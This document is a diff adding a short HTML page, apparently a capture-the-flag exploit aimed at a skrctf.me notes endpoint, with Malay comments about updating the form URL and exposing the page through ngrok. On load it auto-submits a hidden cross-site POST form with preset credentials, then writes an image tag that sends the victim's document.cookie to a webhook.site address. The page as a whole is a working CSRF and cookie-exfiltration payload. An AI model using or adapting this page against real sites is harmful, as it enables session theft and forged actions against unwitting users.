@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>hello hai bye</h1>
+    <!--form action url ubah yg latest-->
+    <!--buat webpage public accessable guna ngrok-->
+    <form action="https://skrctf.me/ports/286f75c2341910f6a77c1ce675ec8d4e/notes.php" method="POST" id="myForm">
+      <input type="hidden" name='username' value='asdf' />
+      <input type="hidden" name='password' value='asdf' />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      // Add a small delay to ensure the form elements are ready
+      setTimeout(function() {
+        document.forms[0].submit(); // Automatically submit the form
+        document.write('<img src="https://webhook.site/c372b661-1e92-40ed-9a01-f5a4fd487436?test='+document.cookie+'" />'); // Triggered after form submission
+      }, 1000); // Adjust the delay as needed
+    </script>
+    <h2>submitted</h2>
+  </body>
+
+</html>
